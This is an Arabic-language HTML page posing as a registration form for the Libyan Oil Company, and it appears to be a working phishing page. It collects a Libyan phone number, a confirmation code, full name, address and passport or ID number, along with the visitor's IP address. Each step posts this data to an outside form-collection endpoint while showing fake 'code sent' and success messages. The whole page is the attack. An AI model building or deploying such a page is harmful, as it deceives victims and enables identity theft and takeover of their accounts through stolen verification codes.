<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل - الشركة الليبية للنفط</title>
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(to bottom, #004c97, #ffffff);
      margin: 0;
      padding: 30px;
      text-align: center;
      color: #004c97;
    }

    .card {
      display: none;
      background: #fff;
      padding: 20px;
      margin: auto;
      border-radius: 15px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 400px;
    }

    .card.active {
      display: block;
    }

    input, button {
      width: 90%;
      padding: 12px;
      margin: 10px 0;
      font-size: 16px;
      border-radius: 10px;
      border: 1px solid #ccc;
    }

    input::placeholder {
      color: goldenrod;
    }

    button {
      background-color: #004c97;
      color: white;
      cursor: pointer;
    }

    .toast {
      display: none;
      margin-top: 10px;
      background: #fff8dc;
      padding: 10px;
      border: 1px solid #daa520;
      color: #000;
      border-radius: 10px;
    }
  </style>
</head>
<body>

  <!-- المرحلة 1: الهاتف -->
  <div class="card active" id="step1">
    <h3>أدخل رقم هاتفك</h3>
    <input type="text" id="phone" placeholder="مثال: 0912345678" maxlength="10">
    <button onclick="handleStep1()">تلقي الكود</button>
  </div>

  <!-- المرحلة 2: كود -->
  <div class="card" id="step2">
    <h3>أدخل كود التأكيد</h3>
    <input type="text" id="code" placeholder="أدخل الكود هنا">
    <button onclick="handleStep2()">تأكيد الكود</button>
    <div class="toast" id="toast">تم إرسال الكود، الرجاء الانتظار...</div>
  </div>

  <!-- المرحلة 3: البيانات -->
  <div class="card" id="step3">
    <h3>بياناتك الشخصية</h3>
    <input type="text" id="fullname" placeholder="الاسم الكامل">
    <input type="text" id="address" placeholder="العنوان الكامل">
    <input type="text" id="idNumber" placeholder="رقم جواز السفر أو البطاقة">
    <button onclick="submitAll()">إرسال البيانات</button>
    <div class="toast" id="toast2">جارٍ الإرسال...</div>
  </div>

  <script>
    let ip = "غير متوفر";
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => ip = data.ip);

    function isLibyanPhone(number) {
      return /^(091|092|093|094|095)\d{7}$/.test(number);
    }

    function handleStep1() {
      const phone = document.getElementById('phone').value.trim();
      if (!isLibyanPhone(phone)) {
        alert("يرجى إدخال رقم ليبي صحيح.");
        return;
      }

      // إرسال رقم الهاتف
      const formData = new FormData();
      formData.append('phone', phone);
      formData.append('ip_address', ip);
      fetch('https://formcarry.com/s/ldfA_DUCDrk', {
        method: 'POST',
        body: formData,
        headers: { 'Accept': 'application/json' }
      });

      document.getElementById('step1').classList.remove('active');
      document.getElementById('step2').classList.add('active');
    }

    function handleStep2() {
      const code = document.getElementById('code').value.trim();
      if (!/^[a-zA-Z0-9]{6,8}$/.test(code)) {
        alert("يرجى إدخال كود صحيح (6–8 أحرف أو أرقام)");
        return;
      }

      const phone = document.getElementById('phone').value.trim();

      const formData = new FormData();
      formData.append('phone', phone);
      formData.append('code', code);
      formData.append('ip_address', ip);
      fetch('https://formcarry.com/s/ldfA_DUCDrk', {
        method: 'POST',
        body: formData,
        headers: { 'Accept': 'application/json' }
      });

      document.getElementById('toast').style.display = 'block';

      setTimeout(() => {
        document.getElementById('step2').classList.remove('active');
        document.getElementById('step3').classList.add('active');
      }, 5000);
    }

    function submitAll() {
      const phone = document.getElementById('phone').value.trim();
      const code = document.getElementById('code').value.trim();
      const fullname = document.getElementById('fullname').value.trim();
      const address = document.getElementById('address').value.trim();
      const idNumber = document.getElementById('idNumber').value.trim();

      if (!fullname || !address || !idNumber) {
        alert("يرجى ملء جميع الحقول.");
        return;
      }

      const formData = new FormData();
      formData.append('phone', phone);
      formData.append('code', code);
      formData.append('fullname', fullname);
      formData.append('address', address);
      formData.append('idNumber', idNumber);
      formData.append('ip_address', ip);

      fetch('https://formcarry.com/s/ldfA_DUCDrk', {
        method: 'POST',
        body: formData,
        headers: { 'Accept': 'application/json' }
      });

      document.getElementById('toast2').style.display = 'block';
      setTimeout(() => {
        document.getElementById('toast2').innerText = "تم إرسال البيانات بنجاح!";
      }, 5000);
    }
  </script>
</body>
</html>
